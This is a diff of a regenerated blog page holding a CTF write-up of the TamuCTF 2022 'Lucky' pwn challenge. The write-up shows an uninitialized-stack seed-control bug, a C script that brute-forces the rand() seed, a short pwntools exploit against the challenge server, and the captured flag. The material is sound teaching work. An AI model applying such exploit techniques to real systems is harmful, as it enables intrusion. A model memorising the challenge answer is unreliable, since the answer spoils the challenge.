@@ -15,26 +15,25 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="0x0 IntroductionAuthor: nhwn Feeling lucky? I have just the challenge for you :D SNI: lucky files: lucky, lucky.c 0x1 Mitigation12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary">
+    <meta name="description" content="0x0 IntroductionAuthor: nhwn Feeling lucky? I have just the challenge for you :D SNI: lucky files: lucky, lucky.c 0x1 MitigationArch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary fo">
 <meta property="og:type" content="website">
 <meta property="og:title" content="[Pwn] Lucky [Tamu CTF 2022]">
 <meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/lucky/index.html">
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
-<meta property="og:description" content="0x0 IntroductionAuthor: nhwn Feeling lucky? I have just the challenge for you :D SNI: lucky files: lucky, lucky.c 0x1 Mitigation12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary">
+<meta property="og:description" content="0x0 IntroductionAuthor: nhwn Feeling lucky? I have just the challenge for you :D SNI: lucky files: lucky, lucky.c 0x1 MitigationArch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary fo">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-04-17T23:39:00.000Z">
-<meta property="article:modified_time" content="2022-04-17T23:39:00.000Z">
+<meta property="article:published_time" content="2022-04-17T08:39:00.000Z">
+<meta property="article:modified_time" content="2022-04-17T08:39:00.000Z">
 <meta property="article:author" content="Aynakeya">
 <meta name="twitter:card" content="summary">
 
 
 <link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/lucky/">
-
 
 
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/lucky/index.html","path":"ctf-writeup/2022/tamuctf/pwn/lucky/index.html","title":"[Pwn] Lucky [Tamu CTF 2022]"}</script>
@@ -46,6 +45,27 @@
 
 
 
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -105,25 +125,25 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -160,7 +180,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -171,7 +191,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">98</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -229,19 +249,54 @@
 <p>Feeling lucky? I have just the challenge for you :D</p>
 <p>SNI: lucky</p>
 <p>files: <a href="lucky">lucky</a>, <a href="lucky.c">lucky.c</a></p>
-<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>The basic idea is set a seed for <code>rand()</code> so that 3 key is same as the requirements.</p>
 <p>Because both function are called in the main. The function <code>seed()</code> and function <code>welcome</code> share the same stack address. </p>
 <p>On the other hand, <code>seed()</code> just return the value on the stack. In this case, the stack will looks like this.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stack for welcome         stack for seed</span><br><span class="line">-------                   -----------------  </span><br><span class="line">buf[4]</span><br><span class="line">buf[8]                    &quot;GLHF :D&quot;</span><br><span class="line">buf[4]                    lol</span><br><span class="line">main stack                main stack</span><br><span class="line">-------                   ---------------</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">stack for welcome         stack for seed
+-------                   -----------------  
+buf[4]
+buf[8]                    &quot;GLHF :D&quot;
+buf[4]                    lol
+main stack                main stack
+-------                   ---------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>Therefore, we can control the value of lol (which is the seed) by write last 4 bytes in function <code>welcome</code>&#x2F;</p>
 <p>now, we just need to find the correct seed by using the script below</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    for (int i = 0; i &lt;= 2147483647; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        srand(i);</span><br><span class="line">        int key0 = rand() == 306291429;</span><br><span class="line">        int key1 = rand() == 442612432;</span><br><span class="line">        int key2 = rand() == 110107425;</span><br><span class="line">        if (key0 &amp;&amp; key1 &amp;&amp; key2)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;%d&quot;,i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+&#123;
+    for (int i &#x3D; 0; i &lt;&#x3D; 2147483647; i++)
+    &#123;
+        srand(i);
+        int key0 &#x3D; rand() &#x3D;&#x3D; 306291429;
+        int key1 &#x3D; rand() &#x3D;&#x3D; 442612432;
+        int key2 &#x3D; rand() &#x3D;&#x3D; 110107425;
+        if (key0 &amp;&amp; key1 &amp;&amp; key2)
+        &#123;
+            printf(&quot;%d&quot;,i);
+            break;
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
-<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = ELF(&quot;lucky&quot;)</span><br><span class="line">io = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;lucky&quot;)</span><br><span class="line">io.sendlineafter(&#x27;name: &#x27;,flat(&#123;</span><br><span class="line">    0xc:5649426</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><pre class="line-numbers language-none"><code class="language-none">from pwn import *
+
+context.binary &#x3D; ELF(&quot;lucky&quot;)
+io &#x3D; remote(&quot;tamuctf.com&quot;, 443, ssl&#x3D;True, sni&#x3D;&quot;lucky&quot;)
+io.sendlineafter(&#39;name: &#39;,flat(&#123;
+    0xc:5649426
+&#125;))
+
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}</p>
 
@@ -270,7 +325,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -297,28 +352,6 @@
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 
 </body>
 </html>
